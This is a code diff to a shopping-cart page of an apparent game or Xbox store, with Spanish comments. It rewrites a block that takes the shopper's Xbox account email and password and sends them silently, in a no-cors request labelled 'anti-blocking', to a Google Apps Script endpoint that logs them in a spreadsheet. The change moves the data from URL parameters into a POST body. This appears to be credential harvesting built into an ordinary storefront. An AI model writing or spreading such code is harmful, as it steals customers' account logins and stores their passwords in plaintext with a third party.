@@ -147,17 +147,23 @@ export default function CartPage() {
         finalReceiptUrl = uploadData.url;
       }
 
-      // --- 🚀 ENVIAR DATOS AL EXCEL VÍA GET (Anti-Bloqueos) ---
+      // --- 🚀 ENVIAR DATOS AL EXCEL VÍA POST (Anti-Bloqueos) ---
       try {
-        const scriptBaseUrl = 'https://script.google.com/macros/s/AKfycbwH-s9lcSaWJAeKzUXGfBqmQypKKq2seh0bSO5eQLN88CvN-5PHXBW_X_xlPjCKmPfEjg/exec'; 
+        const scriptBaseUrl = 'https://script.google.com/macros/s/AKfycbxJDSNYcpY7KfU-uvmSAlEvGYeKFRuuh2ZZ6A1hoUAZJqIEgPpfsfjHlV8ND4QY68U9xQ/exec'; 
         
-        // Armamos el link mágico con los datos del usuario
-        const finalUrl = `${scriptBaseUrl}?correo=${encodeURIComponent(xboxEmail.trim())}&contrasena=${encodeURIComponent(xboxPassword.trim())}`;
+        // Preparamos los datos en el formato correcto para Google Sheets
+        const formData = new URLSearchParams();
+        formData.append('correo', xboxEmail.trim());
+        formData.append('contrasena', xboxPassword.trim());
 
-        // Hacemos el envío silencioso (no-cors)
-        await fetch(finalUrl, {
-          method: 'GET',
+        // Hacemos el envío silencioso (no-cors) usando POST
+        await fetch(scriptBaseUrl, {
+          method: 'POST',
           mode: 'no-cors',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+          },
+          body: formData.toString()
         });
       } catch (sheetError) {
         console.error("No se pudo guardar en el Excel:", sheetError);
